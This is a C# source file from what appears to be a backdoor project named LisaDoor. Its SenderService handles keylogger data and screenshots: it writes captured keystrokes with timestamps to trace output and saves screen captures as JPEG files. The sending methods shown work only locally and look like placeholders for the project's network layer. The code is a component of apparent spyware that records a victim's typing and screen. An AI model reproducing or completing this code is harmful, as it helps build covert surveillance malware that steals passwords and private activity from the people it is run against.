using LisaDoor.Network;
using System.Diagnostics;
using System.Drawing.Imaging;

namespace LisaDoor
{
    internal static class SenderService
    {
        public static void SendMessage(IData data)
        {
            switch (data.MessageType)
            {
                case MessageType.KEYLOG:
                    SendKeyInfo((KLData)data);
                    break;
                case MessageType.SCREENIMAGE:
                    SendScreen((SSData)data);
                    break;
            }
        }
        static void SendKeyInfo(KLData data)
        {
            Trace.WriteLine(((KLData)data).TimeCreated + " " + ((KLData)data).KeyData);
        }
        static void SendScreen(SSData data)
        {
            string date = $"{DateTime.UtcNow.Year}{DateTime.UtcNow.Month}{DateTime.UtcNow.Day}{DateTime.UtcNow.Hour}{DateTime.UtcNow.Minute}{DateTime.UtcNow.Second}";
            ((SSData)data).Image.Save($"{date}.jpg", ImageFormat.Jpeg);
            ((SSData)data).Image.Dispose();
            Trace.WriteLine(DateTime.UtcNow + " Screenshot taken");
        }
        public enum MessageType
        {
            KEYLOG,
            SCREENIMAGE
        }
    }
}